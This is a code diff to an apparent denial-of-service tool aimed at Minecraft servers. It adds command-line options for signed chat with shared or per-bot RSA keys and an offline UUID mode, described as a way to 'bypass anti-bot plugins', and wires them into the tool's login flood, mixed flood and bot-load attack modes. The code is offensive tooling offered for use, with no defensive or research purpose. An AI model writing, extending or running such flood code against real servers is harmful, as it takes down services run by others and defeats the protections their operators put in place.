@@ -45,6 +45,14 @@ def _parse_args():
     p.add_argument("--fetch-proxies", action="store_true",
                    help="auto-fetch public proxy lists and verify them")
     p.add_argument("--online", action="store_true", help="online (Mojang) mode (needs auth, rarely)")
+    p.add_argument("--signed", action="store_true",
+                   help="profile key + signed chat (bypass anti-bot plugins)")
+    p.add_argument("--share-key", dest="share_key", action="store_true", default=True,
+                   help="one shared RSA-2048 for the whole wave (default)")
+    p.add_argument("--own-key", dest="share_key", action="store_false",
+                   help="each bot generates its own RSA-2048 key (slow, ~6 s each)")
+    p.add_argument("--offline-uuid", action="store_true",
+                   help="explicit offline (Bungee) UUID in login_start")
     p.add_argument("--no-scan", action="store_true", help="realip: skip subnet scan")
     p.add_argument("--chat-every", type=float, default=8.0, help="seconds between bot chats")
     p.add_argument("--quiet", action="store_true")
@@ -178,7 +186,9 @@ async def _run_flood(args, mode):
 
     stats = ddos.Stats()
     log = lambda m: None if args.quiet else print(m)
-    log(f"mode={mode} host={args.host}:{args.port} version={version} workers={args.workers}")
+    extra = " signed(" + ("shared" if args.share_key else "own-key") + ")" if args.signed else ""
+    off = " offline-uuid" if args.offline_uuid else ""
+    log(f"mode={mode} host={args.host}:{args.port} version={version} workers={args.workers}{extra}{off}")
     t0 = time.time()
     last = [t0]
 
@@ -204,15 +214,19 @@ async def _run_flood(args, mode):
                                 stop=lambda: stop["flag"], stats=stats, log=log)
         elif mode == "login":
             await ddos.login_ddos(args.host, args.port, version, workers=args.workers,
-                                  stop=lambda: stop["flag"], stats=stats, log=log)
+                                  stop=lambda: stop["flag"], stats=stats, log=log,
+                                  signed=args.signed, share_key=args.share_key)
         elif mode == "mixed":
             pool = await ddos.mixed_ddos(args.host, args.port, version,
                                          workers=args.workers, bot_count=args.bott,
-                                         stop=lambda: stop["flag"], stats=stats, log=log)
+                                         stop=lambda: stop["flag"], stats=stats, log=log,
+                                         signed=args.signed, share_key=args.share_key)
         elif mode == "bot":
             pool = ddos.bot_load(args.host, args.port, version, count=args.bott,
                                  proxy=proxies[0] if proxies else None,
-                                 online=args.online, chat_every=args.chat_every, log=log)
+                                 online=args.online, chat_every=args.chat_every, log=log,
+                                 signed=args.signed, share_key=args.share_key,
+                                 offline_uuid=True if args.offline_uuid else None)
             while not stop["flag"]:
                 await asyncio.sleep(1.0)
                 s = pool.stats()
